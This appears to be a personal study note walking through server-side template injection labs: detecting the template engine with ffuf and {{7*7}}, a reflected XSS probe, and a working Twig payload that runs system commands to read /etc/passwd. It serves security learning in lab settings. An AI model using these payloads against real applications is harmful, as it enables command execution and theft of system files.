
Templating Engine aloows us to separate presentation layer and logic layer of the code
We can insert variable or sometimes even complex logics directly into our templates

Some popular templating engines :jinja2, twig, handlebars, freemarker

If our input is passed unchecked into the template engine and ***it has valid template syntax*** we get SSTI

i/p : hello
gets rendered on the page
Also a good place to test for XSS

Request being sent to server and in next response our script is executed so Reflected XSS

```js
<img src=x onerror="alert`1`">
```


```sh
ffuf -r -c -w /usr/share/wordlists/seclists/SecLists-master/Fuzzing/template-engines-expression.txt:FUZZ -request lab1.txt -request-proto http
```

Check few results and error results show templating engine used is twig

Search SSTI Hacktricks and and search there by Twig template engine

i/p : {{7\*7}}

o/p : 49

View the page source and check if there is 49 there as well. 
If it is then it is SSTI and not Client Side Template Injection
If in page source there is {{7\*7}} and in browser we see the result i.e 49 then it is Client Side Template Injection and that the payload was executed client side

```sh
{{['cat\x20/etc/passwd']|filter('system')}}
```

and we get /etc/passwd file

![[ssti1.png]]


---

### SSTI Challenge Lab

Try the same payload

i/p : {{7\*7}}

but it renders it as it is {{7\*7}} and dosent show the result

Send the request and repeater and check the Raw response

![[ssti2.png]]


Here it shows that our payload executed properly

Whats probably happening is that it is properly being rendered but then our card is being
updated by client side Javascript so its hidden 

The we can delete the frontend script from page source by intercepting response to the request

![[ssti3.png]]


And now we can see it being rendered properly

***Depending on templating engines, our payloads will be very very different so do research properly***

